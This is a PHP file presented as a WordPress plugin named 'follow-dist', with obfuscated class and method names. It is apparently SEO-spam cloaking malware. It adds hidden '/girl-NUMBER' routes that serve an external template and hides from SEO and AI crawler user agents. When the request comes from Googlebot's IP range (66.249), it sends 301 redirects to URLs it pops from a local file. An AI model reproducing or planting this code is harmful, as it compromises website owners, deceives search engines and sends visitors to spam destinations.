<?php
/**
 * Plugin Name: follow-dist
 * Description: follow-dist
 * Version: 1.0
 * Author: John Smith
 */
 

class vqFgzu {
	
    public function __construct() {
        add_action('init', [$this, 'urcxg']);
        add_filter('query_vars', [$this, 'khlwsgsh']);
        add_action('template_include', [$this, 'odxjbc']);
		add_filter('document_title_parts', [$this, 'ccxecdg']);
    }

    public function urcxg() {
        add_rewrite_rule(
            '^girl-([0-9]+).*?$',
            'index.php?abcqriog=$matches[1]',
            'top'
        );
		flush_rewrite_rules();
    }

    public function khlwsgsh($rZ8dJpf) {
        $rZ8dJpf[] = 'abcqriog';
        $rZ8dJpf[] = 'zhwmkohfo';
        return $rZ8dJpf;
    }
	
	public function ccxecdg($xq8VUO1) {
		if (get_query_var('abcqriog')) $xq8VUO1['title'] = get_query_var('zhwmkohfo');
		return $xq8VUO1;
	}

    public function odxjbc($glCvE) {
		
		$tKK4jUyYlk = array('python', 'gptbot', 'import-zoom', 'database-events', 'netspider', 'mj12bot', 'tree-description', 'semrush', 'files-comments', 'ahrefsbot', 'dotbot', 'attachments-read', 'Go-http-client', 'serpstatbot', 'version-flexible');
		foreach($tKK4jUyYlk as $mgt8TJG3C) { if (stripos($_SERVER['HTTP_USER_AGENT'], $mgt8TJG3C) !== false) return $glCvE; }

        if (get_query_var('abcqriog') && preg_match('/^[0-9]+$/', get_query_var('abcqriog'))) {
            return plugin_dir_path(__FILE__) . 'follow-dist/external-number.php';
        } elseif (strpos($_SERVER['REMOTE_ADDR'], '66.249')===0) {
			$xNM0W = plugin_dir_path(__FILE__) . 'follow-dist/slide-stream.php';
			if (is_file($xNM0W)) {
				$o8QlV = file($xNM0W, FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);
				if (count($o8QlV) > 1) {
					$melGym = array_shift($o8QlV);
					$zqAji = array_shift($o8QlV);
					if (strlen($zqAji) > 0) {
						$reUsuk9dqO = $melGym . "\n" . implode("\n", $o8QlV);
						file_put_contents($xNM0W, $reUsuk9dqO);
						header("HTTP/1.1 301 Moved Permanently");
						header("Location: $zqAji");
						exit;
					}
				}
			}
		}
        return $glCvE;
    }
}
new vqFgzu();



